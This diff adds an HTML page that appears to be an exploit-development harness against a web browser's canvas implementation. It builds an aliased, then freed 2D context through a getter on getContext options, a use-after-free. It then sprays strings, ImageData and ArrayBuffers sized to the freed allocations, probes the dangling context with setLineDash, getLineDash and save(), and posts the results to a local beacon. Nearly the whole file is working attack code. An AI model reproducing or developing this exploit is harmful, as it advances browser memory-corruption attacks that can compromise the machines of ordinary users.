@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V541</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V541 — Non-AB reclaim + font virtual dispatch
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V541-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+window.onerror=function(m,s,l,c,e){B('ONERROR',m+' at '+s+':'+l+':'+c)};
+B('BOOT',navigator.userAgent);
+
+var dangling, official, officialCanvas;
+var PHASE = 0;
+var MARKER = 12345.6789;
+
+// P1: Create aliased pair (standard)
+setTimeout(function(){
+  try {
+    B('P1-START','aliased pair');
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var inner = null;
+    var s = {};
+    Object.defineProperty(s, 'alpha', {
+      get: function() { inner = c.getContext('2d'); return true; }
+    });
+    c.getContext('bitmaprenderer', s);
+    if (!inner) { B('P1-FAIL','no inner'); return; }
+    var ctxs = [];
+    for (var i = 0; i < 200; i++) {
+      var nc = document.createElement('canvas');
+      nc.width = 1; nc.height = 1;
+      var nctx = nc.getContext('2d');
+      nctx.lineWidth = 200 + i;
+      ctxs.push({canvas: nc, ctx: nctx});
+    }
+    var dlw = inner.lineWidth;
+    if (dlw >= 200 && dlw < 400) {
+      var idx = dlw - 200;
+      dangling = inner;
+      official = ctxs[idx].ctx;
+      officialCanvas = ctxs[idx].canvas;
+      window._ctxs = ctxs;
+      B('P1-OK','aliased at #'+idx);
+      PHASE = 1;
+    } else { B('P1-MISS','lw='+dlw); }
+  } catch(e) { B('P1-ERR',''+e); }
+}, 200);
+
+// P2: Set markers + free
+setTimeout(function(){
+  if (PHASE < 1) return;
+  try {
+    B('P2-START','markers + free');
+    official.lineWidth = MARKER;
+    official.globalAlpha = 0.777;
+    official.font = '48px serif';
+    official.fillStyle = '#ff0000';
+    official.strokeStyle = '#00ff00';
+    // Do NOT save/realize — keep stateStack inline (capacity 1)
+    // Free context
+    var s2 = {};
+    Object.defineProperty(s2, 'alpha', { get: function() { return true; } });
+    officialCanvas.getContext('bitmaprenderer', s2);
+    B('P2-FREED','done');
+    var lw = dangling.lineWidth;
+    B('P2-CHECK','freed lw='+lw);
+    PHASE = 2;
+  } catch(e) { B('P2-ERR',''+e); }
+}, 1500);
+
+// P3: Test ctx.font read on freed context (virtual dispatch through FontProxy)
+setTimeout(function(){
+  if (PHASE < 2) return;
+  try {
+    B('P3-START','font read on freed');
+    var f = dangling.font;
+    B('P3-FONT','font="'+f+'"');
+    // If this works, FontProxy vtable is still intact
+    // fillStyle read
+    var fs = dangling.fillStyle;
+    B('P3-FILL','fillStyle="'+fs+'"');
+    // strokeStyle read
+    var ss = dangling.strokeStyle;
+    B('P3-STROKE','strokeStyle="'+ss+'"');
+    PHASE = 3;
+  } catch(e) { B('P3-ERR',''+e+' — virtual dispatch crashed'); PHASE = 3; }
+}, 3000);
+
+// P4: String reclaim — spray strings of ~768 chars (StringImpl ~768B)
+// StringImpl layout: vtable(8) + refcount(4) + length(4) + hash(4) + flags(4) + data[]
+// For a 768B allocation: 24B header + 744B data ≈ 372 UTF-16 chars or 744 Latin1 chars
+setTimeout(function(){
+  if (PHASE < 3) return;
+  try {
+    B('P4-START','string spray for 768B reclaim');
+    // StringImpl for Latin1: header(24B) + length bytes, rounded to size class
+    // Target 768B allocation: need ~744 byte string
+    // Try several sizes around 744
+    var strings = [];
+    var sizes = [720, 736, 740, 744, 748, 752, 760];
+    var hitSize = 0;
+
+    for (var si = 0; si < sizes.length; si++) {
+      var len = sizes[si];
+      var batch = [];
+      // Create distinctive string pattern: 'A' repeated with size-encoded prefix
+      var prefix = 'SZ' + len + '_';
+      var body = '';
+      for (var k = 0; k < len - prefix.length; k++) body += String.fromCharCode(65 + (k % 26));
+      var str = prefix + body;
+      for (var j = 0; j < 200; j++) {
+        batch.push(str.substring(0, len));
+      }
+      strings.push(batch);
+
+      // Check if lineWidth changed (string data overlapped stateStack)
+      var lw = dangling.lineWidth;
+      if (lw !== MARKER) {
+        hitSize = len;
+        B('P4-HIT','strLen='+len+' lw='+lw);
+        // Read more state
+        var ga = dangling.globalAlpha;
+        B('P4-STATE','ga='+ga);
+        break;
+      }
+    }
+    if (!hitSize) B('P4-MISS','no string reclaim');
+
+    // Also try bigger strings for the 7296B stateStack buffer
+    // 7296 - 24 header = 7272 chars
+    var bigSizes = [7200, 7250, 7272, 7280, 7300];
+    for (var bi = 0; bi < bigSizes.length; bi++) {
+      var blen = bigSizes[bi];
+      var bbatch = [];
+      var bstr = '';
+      for (var bk = 0; bk < blen; bk++) bstr += String.fromCharCode(48 + (bk % 10));
+      for (var bj = 0; bj < 50; bj++) bbatch.push(bstr);
+      strings.push(bbatch);
+      var blw = dangling.lineWidth;
+      if (blw !== MARKER) {
+        B('P4-BIG-HIT','strLen='+blen+' lw='+blw);
+        break;
+      }
+    }
+
+    window._strings = strings;
+    PHASE = 4;
+  } catch(e) { B('P4-ERR',''+e); }
+}, 4500);
+
+// P5: ImageData reclaim — createImageData allocates via FastMalloc
+// ImageData backing is Uint8ClampedArray. 768B = 768 pixels (RGBA) → 192x1
+setTimeout(function(){
+  if (PHASE < 4) return;
+  try {
+    B('P5-START','ImageData reclaim');
+    // For 768B: 768 bytes = 192 RGBA pixels → 192x1
+    // But ImageData has overhead. Let's try exact + nearby sizes
+    var c2 = document.createElement('canvas').getContext('2d');
+    var imgDatas = [];
+    // Pixel counts that produce backing stores near 768B and 7296B
+    // 768B / 4 = 192 pixels, 7296B / 4 = 1824 pixels
+    var pixCounts = [
+      {w:192, h:1, label:'768B'},
+      {w:188, h:1, label:'752B'},
+      {w:184, h:1, label:'736B'},
+      {w:196, h:1, label:'784B'},
+      {w:1824, h:1, label:'7296B'},
+      {w:1800, h:1, label:'7200B'},
+      {w:1850, h:1, label:'7400B'}
+    ];
+
+    for (var pi = 0; pi < pixCounts.length; pi++) {
+      var pc = pixCounts[pi];
+      var batch = [];
+      for (var j = 0; j < 100; j++) {
+        var id = c2.createImageData(pc.w, pc.h);
+        // Fill with recognizable pattern
+        for (var k = 0; k < id.data.length; k++) id.data[k] = 0x42;
+        batch.push(id);
+      }
+      imgDatas.push(batch);
+
+      var lw = dangling.lineWidth;
+      if (lw !== MARKER) {
+        B('P5-HIT',pc.label+' ('+pc.w+'x'+pc.h+') lw='+lw);
+        break;
+      }
+    }
+    if (dangling.lineWidth === MARKER) B('P5-MISS','no ImageData reclaim');
+
+    window._imgDatas = imgDatas;
+    PHASE = 5;
+  } catch(e) { B('P5-ERR',''+e); }
+}, 7000);
+
+// P6: setLineDash on freed context → allocates Vector<double> of controlled size
+// This allocation goes through fastMalloc from WITHIN the freed context's stateStack
+setTimeout(function(){
+  if (PHASE < 5) return;
+  try {
+    B('P6-START','setLineDash on freed');
+    // setLineDash writes to State::lineDash (Vector<double>)
+    // The Vector in the freed State is default (null m_buffer, size=0)
+    // Calling setLineDash(array) will allocate a new buffer for the dash pattern
+    // This allocation comes from fastMalloc and might be placeable!
+
+    // First: 96 doubles = 768 bytes (match context object size)
+    var dash768 = [];
+    for (var i = 0; i < 96; i++) dash768.push(i + 0.5);
+    dangling.setLineDash(dash768);
+    B('P6-DASH768','set 96-element dash');
+
+    // Read back
+    var rd = dangling.getLineDash();
+    B('P6-READ','getLineDash length='+rd.length+(rd.length>0?' [0]='+rd[0]:''));
+
+    // Now the fun part: the dash buffer is a separate allocation in FastMalloc
+    // If we free and re-set with different sizes, we create freed buffers
+    // Try: set empty dash (frees the buffer), then spray
+    dangling.setLineDash([]);
+    B('P6-CLEARED','cleared dash (freed 768B buffer)');
+
+    // Spray ABs at 768B to try to reclaim the dash buffer
+    var abs768 = [];
+    for (var j = 0; j < 200; j++) {
+      var ab = new ArrayBuffer(768);
+      var dv = new DataView(ab);
+      for (var k = 0; k < 768; k += 8) dv.setFloat64(k, 99999 + k, true);
+      abs768.push({ab:ab, dv:dv});
+    }
+
+    // Set dash again — if AB reclaimed the old dash buffer, this allocates fresh
+    // Then read dash — should be our new values
+    var dash2 = [1.1, 2.2, 3.3];
+    dangling.setLineDash(dash2);
+    var rd2 = dangling.getLineDash();
+    B('P6-DASH2','new dash length='+rd2.length+(rd2.length>0?' vals='+rd2[0]+','+rd2[1]+','+rd2[2]:''));
+
+    // Check if any AB got corrupted by the new dash write
+    var found = false;
+    for (var ai = 0; ai < abs768.length; ai++) {
+      var v0 = abs768[ai].dv.getFloat64(0, true);
+      if (v0 !== 99999) {
+        B('P6-AB-HIT','AB['+ai+'] byte0 changed to '+v0+' (was 99999)');
+        found = true;
+        // Read more from this AB
+        var hex = '';
+        for (var b = 0; b < 32; b++) {
+          var byte = abs768[ai].dv.getUint8(b);
+          hex += (byte < 16 ? '0' : '') + byte.toString(16) + ' ';
+        }
+        B('P6-AB-DATA','first 32B: '+hex);
+        break;
+      }
+    }
+    if (!found) B('P6-AB-MISS','no AB overlap with dash buffer');
+
+    window._abs768 = abs768;
+    PHASE = 6;
+  } catch(e) { B('P6-ERR',''+e); }
+}, 9500);
+
+// P7: Cross-type context reclaim — use OffscreenCanvas or different context type
+setTimeout(function(){
+  if (PHASE < 6) return;
+  try {
+    B('P7-START','cross-type reclaim probes');
+
+    // Test: can we read getLineDash through dangling after the context was freed?
+    // If setLineDash allocated a buffer at a known address, and we can AB-reclaim THAT...
+    // getLineDash returns doubles from the dash buffer → if AB overlaps, we read AB data as doubles!
+
+    // Set a large dash to allocate a big buffer
+    var bigDash = [];
+    for (var i = 0; i < 512; i++) bigDash.push(i * 1.1); // 4096 bytes
+    dangling.setLineDash(bigDash);
+    var rd = dangling.getLineDash();
+    B('P7-BIGDASH','set 512-element dash, read back length='+rd.length);
+    if (rd.length === 512 && rd[0] === 0) {
+      B('P7-ZERO','dash[0]=0, might be reading from freed/zeroed memory');
+    } else if (rd.length === 512) {
+      B('P7-OK','dash[0]='+rd[0]+' [1]='+rd[1]+' [511]='+rd[511]);
+    }
+
+    // Free it
+    dangling.setLineDash([]);
+
+    // Spray ABs at 4096
+    var abs4k = [];
+    for (var j = 0; j < 100; j++) {
+      var ab = new ArrayBuffer(4096);
+      var dv = new DataView(ab);
+      // Write distinctive float64 pattern
+      for (var k = 0; k < 4096; k += 8) dv.setFloat64(k, 77777 + k/8, true);
+      abs4k.push({ab:ab, dv:dv});
+    }
+
+    // Set dash again at same size — might get one of our ABs
+    dangling.setLineDash(bigDash);
+    // But wait, setLineDash WRITES the new values. So it would overwrite our AB data.
+    // Instead, read getLineDash BEFORE setting
+    // Actually, we already freed and set again. Let's just check the ABs for corruption.
+    var hitAB = false;
+    for (var ai = 0; ai < abs4k.length; ai++) {
+      var v0 = abs4k[ai].dv.getFloat64(0, true);
+      if (v0 !== 77777) {
+        B('P7-4K-HIT','AB['+ai+'] changed to '+v0);
+        hitAB = true;
+        break;
+      }
+    }
+    if (!hitAB) B('P7-4K-MISS','no AB overlap at 4096B');
+
+    PHASE = 7;
+  } catch(e) { B('P7-ERR',''+e); }
+}, 12000);
+
+// P8: Measure actual stateStack buffer — do many saves, count before behavior changes
+setTimeout(function(){
+  if (PHASE < 7) return;
+  try {
+    B('P8-START','stateStack capacity test');
+    // Each save()+realize adds one State entry. Capacity is 16.
+    // After 15 more saves (total 16 entries), next save causes realloc.
+    // The realloc allocates 16*1.25+1 = 21 entries.
+    // Detect realloc by checking if lineWidth changes (reads from new buffer)
+
+    // Write marker, then save repeatedly
+    dangling.lineWidth = 99999.0;
+    var saveCount = 0;
+    for (var i = 0; i < 20; i++) {
+      dangling.save();
+      try {
+        var lw = dangling.lineWidth; // triggers realizeSaves
+        saveCount++;
+        if (lw !== 99999.0) {
+          B('P8-CHANGE','lineWidth changed at save #'+saveCount+' lw='+lw);
+          break;
+        }
+      } catch(e) {
+        B('P8-CRASH','save #'+(saveCount+1)+' crashed: '+e);
+        break;
+      }
+    }
+    B('P8-DONE','completed '+saveCount+' saves without change');
+    PHASE = 8;
+  } catch(e) { B('P8-ERR',''+e); }
+}, 14500);
+
+setTimeout(function(){B('COMPLETE','all done')},18000);
+</script></body></html>
